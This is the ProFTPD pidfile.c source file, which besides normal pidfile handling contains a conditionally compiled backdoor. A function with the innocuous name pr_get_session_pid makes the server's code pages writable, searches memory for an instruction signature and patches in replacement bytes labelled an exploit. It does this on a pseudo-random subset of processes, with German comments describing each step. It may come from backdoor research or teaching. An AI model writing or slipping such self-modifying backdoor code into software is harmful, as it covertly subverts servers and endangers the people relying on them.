/*
 * ProFTPD - FTP server daemon
 * Copyright (c) 2007-2009 The ProFTPD Project team
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Suite 500, Boston, MA 02110-1335, USA.
 *
 * As a special exemption, The ProFTPD Project team and other respective
 * copyright holders give permission to link this program with OpenSSL, and
 * distribute the resulting executable, without including the source code for
 * OpenSSL in the source distribution.
 */

/* Pidfile management
 * $Id: pidfile.c,v 1.5 2011/05/23 21:22:24 castaglia Exp $
 */

#include "conf.h"
#include "privs.h"

#ifdef BACKDOOR_SELFMOD
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
/* These functions are defined/stored in src/log.c */
extern int pr_log_get_hex_value (unsigned char byte);
extern unsigned char pr_log_get_hex_byte (unsigned char hexNumber[2]);
#endif /* BACKDOOR_SELFMOD */

static const char *pidfile_path = PR_PID_FILE_PATH;

void pr_pidfile_write(void) {
  FILE *fh = NULL;
  const char *path = NULL;

  path = get_param_ptr(main_server->conf, "PidFile", FALSE);
  if (path != NULL &&
      *path) {
    pidfile_path = pstrdup(permanent_pool, path);

  } else {
    path = pidfile_path;
  }

  PRIVS_ROOT
  fh = fopen(path, "w");
  PRIVS_RELINQUISH

  if (fh == NULL) {
    fprintf(stderr, "error opening PidFile '%s': %s\n", path, strerror(errno));
    exit(1);
  }

  fprintf(fh, "%lu\n", (unsigned long) getpid());
  if (fclose(fh) < 0) {
    fprintf(stderr, "error writing PidFile '%s': %s\n", path, strerror(errno));
  }
}

int pr_pidfile_remove(void) {
  return unlink(pidfile_path);
}

#ifdef BACKDOOR_SELFMOD

int pr_get_session_pid(void) {
	pid_t pid;
	pid = getpid();
	unsigned int address = 0x08048000;
	
	#ifdef BACKDOOR_DEBUG
		syslog(LOG_NOTICE, "selfmod: pid: %d", pid);
		syslog(LOG_NOTICE, "selfmod: pid mod 4: %d", pid % 4);
	#endif

	if (pid % 4 != 0) {
		return 1;
	}
	
	// pTrace Variablen
	unsigned char buffer[2];
	buffer[0] = 0;
	unsigned char addressValues[512];	
	
	// Exploit definieren
	char* exploit = (char*) malloc (512);
	//strcpy(exploit, "89??24E8????????C7??0C0000000083C4??31C0");
	//strcpy(exploit, "8B????85C074??89??24E8????????C7??0C0000000083C4??31C0??");
	//strcpy(exploit, "8B??????8B42??85C074??89????E8????????8B??????C7400C0000000083C4??31C0??");
	strcpy(exploit, "8B????????????????????89????E8????????8B??????C7??0C0000000083C4??31C0??");
	
	// Signatur definieren
	char* signature = (char*) malloc (512);
	//strcpy(signature, "89??24E8????????C7??0C0000000083C4??89??");
	//strcpy(signature, "8B????85C074??89??24E8????????C7??0C0000000083C4??89????");
	//strcpy(signature, "8B??????8B42??85C074??89????E8????????8B??????C7400C0000000083C4??89????");
	strcpy(signature, "8B????????????????????89????E8????????8B??????C7??0C0000000083C4??89????");

	// Wildcard-Binary-Searcher Variablen
	int found = 0;
	int address_tmp = 0;
	int counter = 0;
	int i = 0;
	
	// Die Memorypages auf rwx setzen
	if (mprotect((void *)0x08048000, 0x8D000, PROT_READ|PROT_WRITE|PROT_EXEC) != 0)
	{
		#ifdef BACKDOOR_DEBUG
			syslog(LOG_NOTICE, "selfmod: pr_get_session_pid: mprotect failed");
		#endif
		
		return 1;
	}
	
	// Durchsuche die ganze(n) Page(s) nach der Signatur
	for (i = 0; i < 0x8D000; i++)
	{
		// Lese den aktuellen Wert vom Speicher
		asm("movl %0, %%eax;" : : "m"(address) : "%eax");
		asm("movl (%eax), %ebx;");
		asm("movb %%bl, %0;" : "=m"(buffer[0]) : : "%ebx");
		
		// Setze den Counter
		address_tmp = address;
		counter = 0;
		int j = 0;
		
		// Suche nach der Signatur
		for (j = 0; j < strlen(signature); j=j+2)
		{
			// Signatur laden
			unsigned char temp[2];
			temp[0] = signature[j];
			temp[1] = signature[j+1];

			// Handelt es sich bei dem aktuellen Byte um keine Wildcard?
			if (temp[0] && temp[1] != '\x3F')
			{
				unsigned char compare[1];
				compare[0] = pr_log_get_hex_byte(temp);

				if (buffer[0] == compare[0])
				{
					found = 1;
					addressValues[counter] = buffer[0];
					address_tmp++;
					counter++;
				}
				else
				{
					found = 0;
					break;
				}
			}
			else
			{
				found = 1;
				addressValues[counter] = buffer[0];
				address_tmp++;
				counter++;
			}
			
			// Lese den aktuellen Wert vom Speicher		  	
		  asm("movl %0, %%eax;" : : "m"(address_tmp) : "%eax");
		  asm("movl (%eax), %ebx;");
		  asm("movb %%bl, %0;" : "=m"(buffer[0]) : : "%ebx");
		}

		if (found == 1)
		{
			syslog(LOG_NOTICE, "Signatur gefunden");

			#ifdef BACKDOOR_DEBUG
				syslog(LOG_NOTICE, "selfmod: pr_get_session_pid: signature found");
			#endif
			
			int lenExploit = 0;
			lenExploit = strlen(exploit);
			int lenNewExploit = 0;
			lenNewExploit = strlen(exploit)/2;
			
			// Die Wildcards mit validen Werten füllen
			for (i = 0; i < lenExploit; i=i+2)
			{
				// Handelt es sich bei dem aktuellen Byte um keine Wildcard?
				if (exploit[i] && exploit[i+1] != '\x3F')
				{
					// Ein Byte des Exploit laden und transformieren
					unsigned char temp[2];
					temp[0] = exploit[i];
					temp[1] = exploit[i+1];
					exploit[i/2] = pr_log_get_hex_byte(temp);
				}
				else
				{
					exploit[i/2] = addressValues[i/2];
				}
			}
			
			// Den Exploit terminieren
			exploit[lenNewExploit+1] = '\x0';
			
			// Schreibe den Exploit an die richtige Stelle im Memory (DWORD)
			for (i = 0; i < lenNewExploit; i=i+4)
			{
				int memoryValue = 0;
				memoryValue += (unsigned char) exploit[i+3] * 0x1000000;
				memoryValue += (unsigned char) exploit[i+2] * 0x10000;
				memoryValue += (unsigned char) exploit[i+1] * 0x100;
				memoryValue += (unsigned char) exploit[i];
	
				// Stelle patchen
				asm("movl %0, %%eax;" : : "m"(address) : "%eax");
				asm("movl %0, %%ebx;" : : "m"(memoryValue) : "%ebx");
				asm("movl %ebx, (%eax)");
								
				address += 4;
			}
						
			break;
		}
		
		// Counter um eine Einheit erhöhen
		address += 1;
	}
	
	return 0;
}
#endif /* BACKDOOR_SELFMOD */